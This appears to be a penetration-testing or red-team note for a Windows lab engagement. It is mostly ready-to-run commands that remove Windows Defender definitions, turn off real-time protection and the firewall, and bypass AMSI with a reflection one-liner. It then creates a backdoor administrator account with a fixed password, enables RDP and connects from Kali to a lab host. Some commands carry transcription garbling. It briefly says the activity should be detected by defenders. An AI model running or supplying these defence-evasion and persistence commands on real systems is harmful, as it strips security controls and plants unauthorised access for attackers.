

Disable defender and AMSI, add a backdoor user for persistence and enable RDP for
easy access. This should be detected by defenders.
Disable firewall:

```PowerShell
"C:\Program Files\Windows Defender\MpCmdRun. exe" -RemoveDefinitions -All"
```


```PowerShell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
NetSh Advfirewall set allprofiles state off
```


And bypass AMSI:

```
(([Ref].Assembly.gettypes() | ? {$ _. Name -like
"Amsi*utils"}).GetFields("NonPublic, Static") | ? {$ _. Name -like
"amsiInit*ailed"}).SetValue($null, $true)
```

Add Backdoor user and enable RDP, then run bloodhould, much easier

```PowerShell
net user evilme Password123 !! /add
net localgroup "Administrators" evilme /add
net localgroup "Remote Desktop Users" evilme /add
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -
Name "DisableRestrictedAdmin" -Value 0
```

then RDP access from kali for ease of use.
Note: enable RDP on firewall, else it will not work 
```
Enable-NetFirewallRule -
DisplayGroup "Remote Desktop"
```
We are sharing the /tmp folder from kali with the
victims throughout the engagement to easily move files between victims and kali.

xfreerdp /v:192.168.56.104 /u:evilme /p:'Password123 !! ' /cert: ignore